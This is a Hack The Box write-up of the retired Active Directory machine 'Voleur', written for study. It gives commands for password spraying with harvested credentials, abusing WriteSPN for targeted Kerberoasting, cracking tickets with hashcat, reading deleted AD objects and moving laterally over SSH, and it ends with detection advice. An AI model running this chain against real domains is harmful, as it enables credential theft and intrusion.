---
machine: Voleur
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, kerberoast, write-spn, tombstone, ssh]
---

# Voleur — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

A DC with `HR` and `IT` shares. An access-review spreadsheet holds usernames and passwords; spraying identifies `svc_ldap` and `svc_iis`. `svc_ldap` has `WriteSPN` over `svc_winrm`, enabling targeted Kerberoasting. After cracking the TGS and entering via WinRM, an ACL chain reaches `svc_ldap`, a deleted account (`todd.wolfe`) is recovered, and `svc_backup` is reached over SSH on port 2222.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> --shares
netexec smb <IP> -u '' -p '' --shares
```

`HR` and `IT` are readable. Download `Access_Review.xlsx` and extract usernames/passwords with `openpyxl` or by converting it to CSV. Values are not published.

```bash
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
```

The spray returns two valid service accounts. Enumerate BloodHound with `svc_ldap`:

```bash
bloodhound-python -u svc_ldap -p '<PASSWORD>' -d voleur.htb -ns <IP> -c All
```

## Initial access

BloodHound shows `WriteSPN` over `svc_winrm`. Add a temporary SPN and request a TGS:

```bash
bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p '<PASSWORD>' \
  set object svc_winrm servicePrincipalName -v 'http/whatever'
impacket-GetUserSPNs voleur.htb/svc_ldap:'<PASSWORD>' -dc-ip <IP> -request
```

Crack the TGS with hashcat mode `13100` and enter via WinRM:

```bash
hashcat -m 13100 svc_winrm.tgs rockyou.txt
netexec winrm <IP> -u svc_winrm -p '<PASSWORD>'
```

## Escalation

From `svc_winrm`, abuse the ACL to reach `svc_ldap`; then recover the deleted `todd.wolfe` account. With AD Recycle Bin, query the deleted object; NetExec's `tombstone` module can also read tombstone attributes.

```bash
netexec ldap <IP> -u svc_ldap -p '<PASSWORD>' -M tombstone
```

The recovered password grants SMB access. `svc_backup`'s SSH key is found in the profile or share and used on port 2222:

```bash
ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- An access inventory on a share is a credential dictionary.
- `WriteSPN` enables targeted Kerberoasting without being an administrator.
- Deleted objects can retain attributes and credentials.
- SSH on port 2222 on a DC is an unusual lateral path.

## Detection and mitigation

- Never store passwords in Excel or department shares.
- Audit `WriteSPN`, `servicePrincipalName` changes and anomalous 4769 TGS requests.
- Restrict reading tombstone objects and the AD Recycle Bin.
- Rotate service credentials and review deleted privileged accounts.

## References

- <https://0xdf.gitlab.io/2025/11/01/htb-voleur.html>
- <https://learn.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname>
- <https://attack.mitre.org/techniques/T1558/003/>
